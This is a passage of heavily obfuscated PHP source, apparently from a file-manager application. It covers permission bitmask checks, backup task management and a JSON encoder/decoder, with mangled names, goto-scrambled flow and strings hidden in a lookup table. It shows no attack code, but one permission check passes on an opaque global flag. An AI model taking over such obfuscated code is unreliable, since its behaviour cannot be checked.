$bÕóÉêÈëŸ[2110] => $bÕóÉêÈëŸ[2121], $bÕóÉêÈëŸ[2112] => 4, $bÕóÉêÈëŸ[2113] => 1, $bÕóÉêÈëŸ[2114] => self::AUTH_SHOW | self::AUTH_VIEW), array($bÕóÉêÈëŸ[386] => LNG($bÕóÉêÈëŸ[2122]), $bÕóÉêÈëŸ[2110] => $bÕóÉêÈëŸ[2123], $bÕóÉêÈëŸ[2112] => 5, $bÕóÉêÈëŸ[2113] => 1, $bÕóÉêÈëŸ[2114] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($bÕóÉêÈëŸ[386] => LNG($bÕóÉêÈëŸ[2124]), $bÕóÉêÈëŸ[2110] => $bÕóÉêÈëŸ[2125], $bÕóÉêÈëŸ[2112] => 7, $bÕóÉêÈëŸ[2113] => 1, $bÕóÉêÈëŸ[2114] => 0)); return $dñì¯Èš°; } public static function authCheck($CÃª¡Ô™ãâ, $e¤­¥·ß®Ş) { $CÃª¡Ô™ãâ = intval($CÃª¡Ô™ãâ); if (_get($GLOBALS, $_SERVER[Å¸ş][459])) { return !0; } if ($CÃª¡Ô™ãâ <= 0) { return !1; } if (($CÃª¡Ô™ãâ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($CÃª¡Ô™ãâ & $e¤­¥·ß®Ş); } public static function authCheckShow($BŒÎ•‚ê¦) { return self::authCheck($BŒÎ•‚ê¦, self::AUTH_SHOW); } public static function authCheckView($fÆ«ß˜°­Ş) { return self::authCheck($fÆ«ß˜°­Ş, self::AUTH_VIEW); } public static function authCheckDownload($e¿¯Ù™Êœ) { return self::authCheck($e¿¯Ù™Êœ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($C¢İÅğÌê„) { return self::authCheck($C¢İÅğÌê„, self::AUTH_UPLOAD); } public static function authCheckEdit($FšÖÖÂ÷ˆÙ) { return self::authCheck($FšÖÖÂ÷ˆÙ, self::AUTH_EDIT); } public static function authCheckRemove($c¾ªï¼ñøó) { return self::authCheck($c¾ªï¼ñøó, self::AUTH_REMOVE); } public static function authCheckShare($d­´²Îô…) { return self::authCheck($d­´²Îô…, self::AUTH_SHARE); } public static function authCheckComment($F†«œùƒ³©) { return self::authCheck($F†«œùƒ³©, self::AUTH_COMMENT); } public static function authCheckEvent($F÷™ùÒ¿é¯) { return self::authCheck($F÷™ùÒ¿é¯, self::AUTH_EVENT); } public static function authCheckRoot($dØä„ù‰—) { return self::authCheck($dØä„ù‰—, self::AUTH_ROOT); } public static function authCheckAction($a§´Š¾¿ƒ, $eÇŠóêó­à) { goto B¥Ä¯¤†Á; f¥Œ–ğòë: if (($a§´Š¾¿ƒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($a§´Š¾¿ƒ & $F†™‚‹±÷); goto dœ†½‹”¬ñ; B¥Ä¯¤†Á: $F…›ÑÛõÉ =& $_SERVER[Å¸ş]; $DäñäÖ…¹È = array($F…›ÑÛõÉ[2126] => self::AUTH_VIEW, $F…›ÑÛõÉ[1038] => self::AUTH_DOWNLOAD, $F…›ÑÛõÉ[103] => self::AUTH_UPLOAD, $F…›ÑÛõÉ[2075] => self::AUTH_EDIT, $F…›ÑÛõÉ[2074] => self::AUTH_REMOVE, $F…›ÑÛõÉ[2085] => self::AUTH_SHARE, $F…›ÑÛõÉ[341] => self::AUTH_COMMENT, $F…›ÑÛõÉ[1424] => self::AUTH_EVENT, $F…›ÑÛõÉ[1562] => self::AUTH_ROOT); if (!isset($DäñäÖ…¹È[$eÇŠóêó­à])) { return; } goto AˆößÑ†¸Î; AˆößÑ†¸Î: $F†™‚‹±÷ = $DäñäÖ…¹È[$eÇŠóêó­à]; $a§´Š¾¿ƒ = intval($a§´Š¾¿ƒ); if ($a§´Š¾¿ƒ <= 0) { return !1; } goto f¥Œ–ğòë; dœ†½‹”¬ñ: } public static function authDisable($d­ß§“¤é¹, $Aˆæ¥¹Š­æ) { if (intval($d­ß§“¤é¹) <= 0) { return 0; } return intval($d­ß§“¤é¹) & ~$Aˆæ¥¹Š­æ; } public $optionType = "\x53\171\163\164\145\155\x2e\x73\x6f\x75\162\x63\x65\x41\165\x74\x68\114\151\163\164"; public $field = array("\x6e\141\x6d\145", "\141\x75\164\x68", "\x6c\141\142\x65\154", "\144\x69\163\160\x6c\141\x79", "\x73\x79\163\164\x65\155", "\x73\x6f\x72\x74"); public function initData() { $FÆÕ±¾ğ»é = $this->authDefault(); foreach ($FÆÕ±¾ğ»é as $A…„Ôã‡) { $this->add($A…„Ôã‡); } } public function listData($Eğˆ…¶ßµ = false, $DŞ¥Ç¾¤¼Š = "\x73\x6f\x72\x74", $dâß‡ĞæÆÁ = false) { return parent::listData($Eğˆ…¶ßµ, $DŞ¥Ç¾¤¼Š, $dâß‡ĞæÆÁ); } public function update($c®•¨¹‚å, $aä²¶õÔ) { $Bİ˜Î‡·ÑÈ =& $_SERVER[Å¸ş]; $bÊ„·–ŒŸî = parent::listData($c®•¨¹‚å); $a³‰µâ¯®¸ = $this->findByName($aä²¶õÔ[$Bİ˜Î‡·ÑÈ[28]]); if (!$bÊ„·–ŒŸî || $a³‰µâ¯®¸ && $a³‰µâ¯®¸[$Bİ˜Î‡·ÑÈ[367]] != $bÊ„·–ŒŸî[$Bİ˜Î‡·ÑÈ[367]]) { return !1; } $this->filterAuth($aä²¶õÔ[$Bİ˜Î‡·ÑÈ[376]]); return parent::update($c®•¨¹‚å, $aä²¶õÔ); } public function remove($eğº¥²¿ï±) { $Fƒ›ˆ¼–ê¿ = parent::listData($eğº¥²¿ï±); if (!$Fƒ›ˆ¼–ê¿ || $Fƒ›ˆ¼–ê¿[$_SERVER[Å¸ş][1078]]) { return !1; } return parent::remove($eğº¥²¿ï±); } public function add($EŒ…ÙÑ‰¶á = array()) { goto aŒã•„óÕ; Cê¿ĞÜ¼í—: $EŒ…ÙÑ‰¶á = array_merge($fÏô„‰î, $EŒ…ÙÑ‰¶á); $EŒ…ÙÑ‰¶á[$B‚ª­Õ„ì[2130]] = $this->getSort(); $this->filterAuth($EŒ…ÙÑ‰¶á[$B‚ª­Õ„ì[376]]); goto E’Œ¦²”£¤; aŒã•„óÕ: $B‚ª­Õ„ì =& $_SERVER[Å¸ş]; if ($this->findByName($EŒ…ÙÑ‰¶á[$B‚ª­Õ„ì[28]])) { return !1; } $fÏô„‰î = array($B‚ª­Õ„ì[28] => $B‚ª­Õ„ì[33], $B‚ª­Õ„ì[376] => 1, $B‚ª­Õ„ì[2127] => $B‚ª­Õ„ì[2128], $B‚ª­Õ„ì[2129] => 1, $B‚ª­Õ„ì[1078] => 0, $B‚ª­Õ„ì[2130] => 0); goto Cê¿ĞÜ¼í—; E’Œ¦²”£¤: return parent::insert($EŒ…ÙÑ‰¶á); goto BÛÂÌ¶Ñ‡¤; BÛÂÌ¶Ñ‡¤: } private function getSort() { $EŞÒõ¾‘÷î =& $_SERVER[Å¸ş]; $dƒ‚³Â¾½Ë = parent::listData(); $Fó„¼Å‘ˆŸ = array_to_keyvalue($dƒ‚³Â¾½Ë, $EŞÒõ¾‘÷î[33], $EŞÒõ¾‘÷î[2130]); return empty($Fó„¼Å‘ˆŸ) ? 0 : max($Fó„¼Å‘ˆŸ) + 1; } private function filterAuth(&$Fç´°ä»Üà) { goto Fœ¿»Ğ‡°; A¦¾ôÀíŞ¦: foreach ($BÖêÒÎÕ˜Î as $E§ë²ÀåÖ¨) { if ($Fç´°ä»Üà & $E§ë²ÀåÖ¨) { $dŒ‡ÜÓ¨ÒŒ[] = $E§ë²ÀåÖ¨; } } if (in_array(self::AUTH_ROOT, $dŒ‡ÜÓ¨ÒŒ)) { $Fç´°ä»Üà = array_sum($BÖêÒÎÕ˜Î); return; } $FŒĞ»ÆÅ– = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto E«¹ÌÈ”‰Ñ; Fœ¿»Ğ‡°: if (!$Fç´°ä»Üà) { return; } $BÖêÒÎÕ˜Î = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $dŒ‡ÜÓ¨ÒŒ = array(); goto A¦¾ôÀíŞ¦; E«¹ÌÈ”‰Ñ: foreach ($dŒ‡ÜÓ¨ÒŒ as $E§ë²ÀåÖ¨) { if (isset($FŒĞ»ÆÅ–[$E§ë²ÀåÖ¨])) { $dŒ‡ÜÓ¨ÒŒ = array_merge($dŒ‡ÜÓ¨ÒŒ, $FŒĞ»ÆÅ–[$E§ë²ÀåÖ¨]); } } $dŒ‡ÜÓ¨ÒŒ[] = self::AUTH_SHOW; $Fç´°ä»Üà = array_sum(array_unique($dŒ‡ÜÓ¨ÒŒ)); goto ağêÛçò•; ağêÛçò•: } public function sort($B…ˆ“ª±Ï, $Fî‡Ôœß˜¥) { return parent::update($B…ˆ“ª±Ï, $Fî‡Ôœß˜¥); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\x62\x61\143\x6b\165\160\114\151\x73\x74"; public $field = array("\151\157", "\156\141\x6d\x65", "\163\164\x61\x74\x75\163", "\143\x6f\156\x74\x65\x6e\164", "\x72\145\x73\165\x6c\164", "\x74\x69\x6d\x65\106\x72\157\x6d", "\164\x69\x6d\x65\x54\157"); public function config() { goto b™İ·³©Œ; b™İ·³©Œ: $cƒ×†õñ =& $_SERVER[Å¸ş]; $D‰†¼µÜ¢ = Model($cƒ×†õñ[1086])->get($cƒ×†õñ[716]); $D‰†¼µÜ¢ = json_decode($D‰†¼µÜ¢, !0); goto e¨‰‚á¬ô; e¨‰‚á¬ô: $D‰†¼µÜ¢ = is_array($D‰†¼µÜ¢) ? $D‰†¼µÜ¢ : array(); if (!isset($D‰†¼µÜ¢[$cƒ×†õñ[695]])) { $D‰†¼µÜ¢[$cƒ×†õñ[695]] = $cƒ×†õñ[83]; } $Bí¨±¸¯÷œ = array(); goto E„´®¾¡ôù; EÊ§„Æ½˜Õ: if (isset($Bí¨±¸¯÷œ[$cƒ×†õñ[190]])) { $Bí¨±¸¯÷œ[$cƒ×†õñ[190]] = json_decode($Bí¨±¸¯÷œ[$cƒ×†õñ[190]], !0); } if (isset($D‰†¼µÜ¢[$cƒ×†õñ[190]])) { $Bí¨±¸¯÷œ[$cƒ×†õñ[190]][$cƒ×†õñ[1411]] = $D‰†¼µÜ¢[$cƒ×†õñ[190]]; unset($D‰†¼µÜ¢[$cƒ×†õñ[190]]); } return array_merge($Bí¨±¸¯÷œ, $D‰†¼µÜ¢); goto B¥ÇÄçã; E„´®¾¡ôù: Action($cƒ×†õñ[2131])->taskInit(); $EˆÙñ”í‹È = Model($cƒ×†õñ[2132])->listData(); foreach ($EˆÙñ”í‹È as $a®áìŒ…‹) { if ($a®áìŒ…‹[$cƒ×†õñ[1078]] == $cƒ×†õñ[83] && $a®áìŒ…‹[$cƒ×†õñ[1424]] == $cƒ×†õñ[2133]) { $Bí¨±¸¯÷œ = $a®áìŒ…‹; break; } } goto EÊ§„Æ½˜Õ; B¥ÇÄçã: } public function listData($b¿Ô­†§²Ÿ = false, $a‰æàİ‘àó = "\155\157\144\x69\146\171\x54\x69\155\145", $bİ¨Üæ¸ = false) { return parent::listData($b¿Ô­†§²Ÿ, $a‰æàİ‘àó, !0); } public function lastItem() { $Bõì‹…˜º = $this->listData(); return !empty($Bõì‹…˜º[0]) ? $Bõì‹…˜º[0] : null; } public function kill($cƒß÷»¥òğ) { goto eÉªƒœà¬Ë; eŸóçã½ì: return $this->remove($cƒß÷»¥òğ); goto F•–¨Âˆ; eÉªƒœà¬Ë: $b ¹•½ÑİŠ =& $_SERVER[Å¸ş]; $Cµ‡òÖ¼İœ = $this->listData($cƒß÷»¥òğ); if (!$Cµ‡òÖ¼İœ || empty($Cµ‡òÖ¼İœ[$b ¹•½ÑİŠ[28]])) { return !0; } goto bÍ—Œ©ø¬‰; Fáô‘Ôäï˜: $A…ìè¬çÌ‡ = $Cµ‡òÖ¼İœ[$b ¹•½ÑİŠ[28]]; $bŸõ™ŠùÒ„ = TEMP_FILES . $b ¹•½ÑİŠ[712] . $A…ìè¬çÌ‡ . $b ¹•½ÑİŠ[8]; IO::remove($bŸõ™ŠùÒ„, !1); goto eŸóçã½ì; bÍ—Œ©ø¬‰: Task::kill($b ¹•½ÑİŠ[715]); Task::kill($b ¹•½ÑİŠ[731]); Task::kill($b ¹•½ÑİŠ[739]); goto Fáô‘Ôäï˜; F•–¨Âˆ: } public function remove($fÍ¼¸”åÖ) { $f¹Éİè¥ = $this->listData($fÍ¼¸”åÖ); if (!$f¹Éİè¥) { return !0; } return $this->backupRemove($f¹Éİè¥); } private function backupRemove($Eåã‹¹ğÛ©) { $dÎˆŠŒ–‡· =& $_SERVER[Å¸ş]; parent::remove($Eåã‹¹ğÛ©[$dÎˆŠŒ–‡·[367]]); $cÈ—¡ôåÊÄ = "\173\x69\x6f\x3a{$Eåã‹¹ğÛ©[$dÎˆŠŒ–‡·[694]]}\175\x2f\x64\141\164\x61\x62\x61\x73\145\57\x62\x61\x63\153\x75\x70\137" . $Eåã‹¹ğÛ©[$dÎˆŠŒ–‡·[28]]; IO::remove($cÈ—¡ôåÊÄ, !1); return !0; } public function start() { goto D¬ˆ•¾»²Û; eš–¢áÁ©·: return !0; goto F‘³ºùëåÃ; AéÖŒ¬¦: if (!$c™õ™ãÓñš->dbFile()) { return !1; } if ($DœÙªËÕÚ[$b÷‘Êğà [695]] == $b÷‘Êğà [470]) { $c™õ™ãÓñš->file(); } Backup::set(array($b÷‘Êğà [692] => 1, $b÷‘Êğà [449] => time())); goto eš–¢áÁ©·; D¬ˆ•¾»²Û: $b÷‘Êğà  =& $_SERVER[Å¸ş]; if ($GLOBALS[$b÷‘Êğà [6]][$b÷‘Êğà [84]][$b÷‘Êğà [2134]] != $b÷‘Êğà [83]) { return !0; } $DœÙªËÕÚ = $this->config(); goto Aæƒå†Ôİ‹; Aæƒå†Ôİ‹: if (!$DœÙªËÕÚ || $DœÙªËÕÚ[$b÷‘Êğà [1408]] != $b÷‘Êğà [83]) { return !1; } $aí¤Œ¡òÆÊ = $this->process(); foreach ($aí¤Œ¡òÆÊ as $a‚Áìèİ÷) { if ($a‚Áìèİ÷) { return Task::restart($a‚Áìèİ÷[$b÷‘Êğà [367]]); } } goto eÎ·ë¯ëÂ; eÎ·ë¯ëÂ: $c™õ™ãÓñš = new Backup(); $c™õ™ãÓñš->keep(); if (!$c™õ™ãÓñš->db()) { return !1; } goto AéÖŒ¬¦; F‘³ºùëåÃ: } public function process() { $c¦ó—“õ¤Ä =& $_SERVER[Å¸ş]; return array($c¦ó—“õ¤Ä[697] => Task::get($c¦ó—“õ¤Ä[715]), $c¦ó—“õ¤Ä[700] => Task::get($c¦ó—“õ¤Ä[731]), $c¦ó—“õ¤Ä[167] => Task::get($c¦ó—“õ¤Ä[739])); } public function restore() { $aíÅé‚øƒÓ =& $_SERVER[Å¸ş]; ActionCall($aíÅé‚øƒÓ[971], !0, 1); ActionCall($aíÅé‚øƒÓ[971], !0, 0); } } goto f²ÄÁÌ—‰ß; cˆ‰İ–ˆ¿: class Services_JSON { function __construct($B™—”ÁÙƒ = 0) { $this->use = $B™—”ÁÙƒ; } function utf162utf8($BÚõÔ²îš¨) { $d¿ÓâåÂŒ =& $_SERVER[Å¸ş]; if (function_exists($d¿ÓâåÂŒ[68])) { return mb_convert_encoding($BÚõÔ²îš¨, $d¿ÓâåÂŒ[1589], $d¿ÓâåÂŒ[1942]); } $dÌÆáÉÜ’ = ord($BÚõÔ²îš¨[0]) << 8 | ord($BÚõÔ²îš¨[1]); switch (!0) { case (127 & $dÌÆáÉÜ’) == $dÌÆáÉÜ’: return chr(127 & $dÌÆáÉÜ’); case (2047 & $dÌÆáÉÜ’) == $dÌÆáÉÜ’: return chr(192 | $dÌÆáÉÜ’ >> 6 & 31) . chr(128 | $dÌÆáÉÜ’ & 63); case (65535 & $dÌÆáÉÜ’) == $dÌÆáÉÜ’: return chr(224 | $dÌÆáÉÜ’ >> 12 & 15) . chr(128 | $dÌÆáÉÜ’ >> 6 & 63) . chr(128 | $dÌÆáÉÜ’ & 63); } return $d¿ÓâåÂŒ[33]; } function utf82utf16($BîñÀ÷‰†Ÿ) { $CÛ„†åŒ‡ =& $_SERVER[Å¸ş]; if (function_exists($CÛ„†åŒ‡[68])) { return mb_convert_encoding($BîñÀ÷‰†Ÿ, $CÛ„†åŒ‡[1942], $CÛ„†åŒ‡[1589]); } switch (strlen($BîñÀ÷‰†Ÿ)) { case 1: return $BîñÀ÷‰†Ÿ; case 2: return chr(7 & ord($BîñÀ÷‰†Ÿ[0]) >> 2) . chr(192 & ord($BîñÀ÷‰†Ÿ[0]) << 6 | 63 & ord($BîñÀ÷‰†Ÿ[1])); case 3: return chr(240 & ord($BîñÀ÷‰†Ÿ[0]) << 4 | 15 & ord($BîñÀ÷‰†Ÿ[1]) >> 2) . chr(192 & ord($BîñÀ÷‰†Ÿ[1]) << 6 | 127 & ord($BîñÀ÷‰†Ÿ[2])); } return $CÛ„†åŒ‡[33]; } function encode($DÏØµŸ¡²Ô) { $A÷‡Ú‘ÆÎ =& $_SERVER[Å¸ş]; switch (gettype($DÏØµŸ¡²Ô)) { case $A÷‡Ú‘ÆÎ[1600]: return $DÏØµŸ¡²Ô ? $A÷‡Ú‘ÆÎ[1599] : $A÷‡Ú‘ÆÎ[1601]; case $A÷‡Ú‘ÆÎ[1943]: return $A÷‡Ú‘ÆÎ[99]; case $A÷‡Ú‘ÆÎ[303]: return (int) $DÏØµŸ¡²Ô; case $A÷‡Ú‘ÆÎ[278]: case $A÷‡Ú‘ÆÎ[277]: return (double) $DÏØµŸ¡²Ô; case $A÷‡Ú‘ÆÎ[312]: $e¾Â‡‡ê—– = $A÷‡Ú‘ÆÎ[33]; $Aç¾—Åß¶¤ = strlen($DÏØµŸ¡²Ô); for ($a¶øïÔŠ = 0; $a¶øïÔŠ < $Aç¾—Åß¶¤; ++$a¶øïÔŠ) { $Fá¯ªËÒ²– = ord($DÏØµŸ¡²Ô[$a¶øïÔŠ]); switch (!0) { case $Fá¯ªËÒ²– == 8: $e¾Â‡‡ê—– .= $A÷‡Ú‘ÆÎ[1944]; break; case $Fá¯ªËÒ²– == 9: $e¾Â‡‡ê—– .= $A÷‡Ú‘ÆÎ[1576]; break; case $Fá¯ªËÒ²– == 10: $e¾Â‡‡ê—– .= $A÷‡Ú‘ÆÎ[1574]; break; case $Fá¯ªËÒ²– == 12: $e¾Â‡‡ê—– .= $A÷‡Ú‘ÆÎ[1945]; break; case $Fá¯ªËÒ²– == 13: $e¾Â‡‡ê—– .= $A÷‡Ú‘ÆÎ[1575]; break; case $Fá¯ªËÒ²– == 34: case $Fá¯ªËÒ²– == 47: case $Fá¯ªËÒ²– == 92: $e¾Â‡‡ê—– .= $A÷‡Ú‘ÆÎ[93] . $DÏØµŸ¡²Ô[$a¶øïÔŠ]; break; case $Fá¯ªËÒ²– >= 32 && $Fá¯ªËÒ²– <= 127: $e¾Â‡‡ê—– .= $DÏØµŸ¡²Ô[$a¶øïÔŠ]; break; case ($Fá¯ªËÒ²– & 224) == 192: $CÈÌ‹¿˜Ôù = pack($A÷‡Ú‘ÆÎ[1946], $Fá¯ªËÒ²–, ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 1])); $a¶øïÔŠ += 1; $AÊ“³å—ßƒ = $this->utf82utf16($CÈÌ‹¿˜Ôù); $e¾Â‡‡ê—– .= sprintf($A÷‡Ú‘ÆÎ[1947], bin2hex($AÊ“³å—ßƒ)); break; case ($Fá¯ªËÒ²– & 240) == 224: $CÈÌ‹¿˜Ôù = pack($A÷‡Ú‘ÆÎ[1946], $Fá¯ªËÒ²–, ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 1]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 2])); $a¶øïÔŠ += 2; $AÊ“³å—ßƒ = $this->utf82utf16($CÈÌ‹¿˜Ôù); $e¾Â‡‡ê—– .= sprintf($A÷‡Ú‘ÆÎ[1947], bin2hex($AÊ“³å—ßƒ)); break; case ($Fá¯ªËÒ²– & 248) == 240: $CÈÌ‹¿˜Ôù = pack($A÷‡Ú‘ÆÎ[1946], $Fá¯ªËÒ²–, ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 1]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 2]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 3])); $a¶øïÔŠ += 3; $AÊ“³å—ßƒ = $this->utf82utf16($CÈÌ‹¿˜Ôù); $e¾Â‡‡ê—– .= sprintf($A÷‡Ú‘ÆÎ[1947], bin2hex($AÊ“³å—ßƒ)); break; case ($Fá¯ªËÒ²– & 252) == 248: $CÈÌ‹¿˜Ôù = pack($A÷‡Ú‘ÆÎ[1946], $Fá¯ªËÒ²–, ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 1]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 2]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 3]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 4])); $a¶øïÔŠ += 4; $AÊ“³å—ßƒ = $this->utf82utf16($CÈÌ‹¿˜Ôù); $e¾Â‡‡ê—– .= sprintf($A÷‡Ú‘ÆÎ[1947], bin2hex($AÊ“³å—ßƒ)); break; case ($Fá¯ªËÒ²– & 254) == 252: $CÈÌ‹¿˜Ôù = pack($A÷‡Ú‘ÆÎ[1946], $Fá¯ªËÒ²–, ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 1]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 2]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 3]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 4]), ord($DÏØµŸ¡²Ô[$a¶øïÔŠ + 5])); $a¶øïÔŠ += 5; $AÊ“³å—ßƒ = $this->utf82utf16($CÈÌ‹¿˜Ôù); $e¾Â‡‡ê—– .= sprintf($A÷‡Ú‘ÆÎ[1947], bin2hex($AÊ“³å—ßƒ)); break; } } return $A÷‡Ú‘ÆÎ[113] . $e¾Â‡‡ê—– . $A÷‡Ú‘ÆÎ[113]; case $A÷‡Ú‘ÆÎ[1948]: if (is_array($DÏØµŸ¡²Ô) && count($DÏØµŸ¡²Ô) && array_keys($DÏØµŸ¡²Ô) !== range(0, sizeof($DÏØµŸ¡²Ô) - 1)) { $D°­ˆøÂƒê = array_map(array($this, $A÷‡Ú‘ÆÎ[1949]), array_keys($DÏØµŸ¡²Ô), array_values($DÏØµŸ¡²Ô)); foreach ($D°­ˆøÂƒê as $dŠĞ½¯ÛöÙ) { if (Services_JSON::isError($dŠĞ½¯ÛöÙ)) { return $dŠĞ½¯ÛöÙ; } } return $A÷‡Ú‘ÆÎ[1066] . join($A÷‡Ú‘ÆÎ[47], $D°­ˆøÂƒê) . $A÷‡Ú‘ÆÎ[315]; } $FÏèÍÊŠóğ = array_map(array($this, $A÷‡Ú‘ÆÎ[1950]), $DÏØµŸ¡²Ô); foreach ($FÏèÍÊŠóğ as $dÄó„áƒ¨İ) { if (Services_JSON::isError($dÄó„áƒ¨İ)) { return $dÄó„áƒ¨İ; } } return $A÷‡Ú‘ÆÎ[157] . join($A÷‡Ú‘ÆÎ[47], $FÏèÍÊŠóğ) . $A÷‡Ú‘ÆÎ[478]; case $A÷‡Ú‘ÆÎ[1951]: $aˆ ‰ŞÊ‰¤ = get_object_vars($DÏØµŸ¡²Ô); $D°­ˆøÂƒê = array_map(array($this, $A÷‡Ú‘ÆÎ[1949]), array_keys($aˆ ‰ŞÊ‰¤), array_values($aˆ ‰ŞÊ‰¤)); foreach ($D°­ˆøÂƒê as $dŠĞ½¯ÛöÙ) { if (Services_JSON::isError($dŠĞ½¯ÛöÙ)) { return $dŠĞ½¯ÛöÙ; } } return $A÷‡Ú‘ÆÎ[1066] . join($A÷‡Ú‘ÆÎ[47], $D°­ˆøÂƒê) . $A÷‡Ú‘ÆÎ[315]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $A÷‡Ú‘ÆÎ[99] : new Services_JSON_Error(gettype($DÏØµŸ¡²Ô) . $A÷‡Ú‘ÆÎ[1952]); } } function name_value($D˜¦‰°Š„Ù, $f©µ‹¥¤÷—) { $D“»ÏÕ–á” = $this->encode($f©µ‹¥¤÷—); if (Services_JSON::isError($D“»ÏÕ–á”)) { return $D“»ÏÕ–á”; } return $this->encode(strval($D˜¦‰°Š„Ù)) . $_SERVER[Å¸ş][4] . $D“»ÏÕ–á”; } function reduce_string($fµëÊ„æ¿Ú) { $fƒãçî…ÎÂ =& $_SERVER[Å¸ş]; $fµëÊ„æ¿Ú = preg_replace(array($fƒãçî…ÎÂ[1953], $fƒãçî…ÎÂ[1954], $fƒãçî…ÎÂ[1955]), $fƒãçî…ÎÂ[33], $fµëÊ„æ¿Ú); return trim($fµëÊ„æ¿Ú); } function decode($e¬ù­¶¿ ) { $a¿İŞÓÆÙ =& $_SERVER[Å¸ş]; $e¬ù­¶¿  = $this->reduce_string($e¬ù­¶¿ ); switch (strtolower($e¬ù­¶¿ )) { case $a¿İŞÓÆÙ[1599]: return !0; case $a¿İŞÓÆÙ[1601]: return !1; case $a¿İŞÓÆÙ[99]: return null; default: $b²‹¿ºöØ = array(); if (is_numeric($e¬ù­¶¿ )) { return (double) $e¬ù­¶¿  == (int) $e¬ù­¶¿  ? (int) $e¬ù­¶¿  : (double) $e¬ù­¶¿ ; } elseif (preg_match($a¿İŞÓÆÙ[1956], $e¬ù­¶¿ , $b²‹¿ºöØ) && $b²‹¿ºöØ[1] == $b²‹¿ºöØ[2]) { $EÀ»µ¦â‰Ó = substr($e¬ù­¶¿ , 0, 1); $DÎëÀŞª¢ˆ = substr($e¬ù­¶¿ , 1, -1); $E¹‰¿ÕáõÜ = $a¿İŞÓÆÙ[33]; $f¶£ÒÃ“ƒØ = strlen($DÎëÀŞª¢ˆ); for ($Bå¨å¾ÓùÜ = 0; $Bå¨å¾ÓùÜ < $f¶£ÒÃ“ƒØ; ++$Bå¨å¾ÓùÜ) { $c¢‰‰ùª×× = substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ, 2); $b»Ï¥ë’ = ord($DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ]); switch (!0) { case $c¢‰‰ùª×× == $a¿İŞÓÆÙ[1944]: $E¹‰¿ÕáõÜ .= chr(8); ++$Bå¨å¾ÓùÜ; break; case $c¢‰‰ùª×× == $a¿İŞÓÆÙ[1576]: $E¹‰¿ÕáõÜ .= chr(9); ++$Bå¨å¾ÓùÜ; break; case $c¢‰‰ùª×× == $a¿İŞÓÆÙ[1574]: $E¹‰¿ÕáõÜ .= chr(10); ++$Bå¨å¾ÓùÜ; break; case $c¢‰‰ùª×× == $a¿İŞÓÆÙ[1945]: $E¹‰¿ÕáõÜ .= chr(12); ++$Bå¨å¾ÓùÜ; break; case $c¢‰‰ùª×× == $a¿İŞÓÆÙ[1575]: $E¹‰¿ÕáõÜ .= chr(13); ++$Bå¨å¾ÓùÜ; break; case $c¢‰‰ùª×× == $a¿İŞÓÆÙ[1354]: case $c¢‰‰ùª×× == $a¿İŞÓÆÙ[1957]: case $c¢‰‰ùª×× == $a¿İŞÓÆÙ[1569]: case $c¢‰‰ùª×× == $a¿İŞÓÆÙ[1571]: if ($EÀ»µ¦â‰Ó == $a¿İŞÓÆÙ[113] && $c¢‰‰ùª×× != $a¿İŞÓÆÙ[1957] || $EÀ»µ¦â‰Ó == $a¿İŞÓÆÙ[55] && $c¢‰‰ùª×× != $a¿İŞÓÆÙ[1354]) { $E¹‰¿ÕáõÜ .= $DÎëÀŞª¢ˆ[++$Bå¨å¾ÓùÜ]; } break; case preg_match($a¿İŞÓÆÙ[1958], substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ, 6)): $DİÕ¶ğÅÔ = chr(hexdec(substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ + 2, 2))) . chr(hexdec(substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ + 4, 2))); $E¹‰¿ÕáõÜ .= $this->utf162utf8($DİÕ¶ğÅÔ); $Bå¨å¾ÓùÜ += 5; break; case $b»Ï¥ë’ >= 32 && $b»Ï¥ë’ <= 127: $E¹‰¿ÕáõÜ .= $DÎëÀŞª¢ˆ[$Bå¨å¾ÓùÜ]; break; case ($b»Ï¥ë’ & 224) == 192: $E¹‰¿ÕáõÜ .= substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ, 2); ++$Bå¨å¾ÓùÜ; break; case ($b»Ï¥ë’ & 240) == 224: $E¹‰¿ÕáõÜ .= substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ, 3); $Bå¨å¾ÓùÜ += 2; break; case ($b»Ï¥ë’ & 248) == 240: $E¹‰¿ÕáõÜ .= substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ, 4); $Bå¨å¾ÓùÜ += 3; break; case ($b»Ï¥ë’ & 252) == 248: $E¹‰¿ÕáõÜ .= substr($DÎëÀŞª¢ˆ, $Bå¨å¾ÓùÜ, 5); $Bå¨å¾ÓùÜ += 4; break; case ($b»Ï¥ë’ & 254) == 252: $E¹‰¿ÕáõÜ 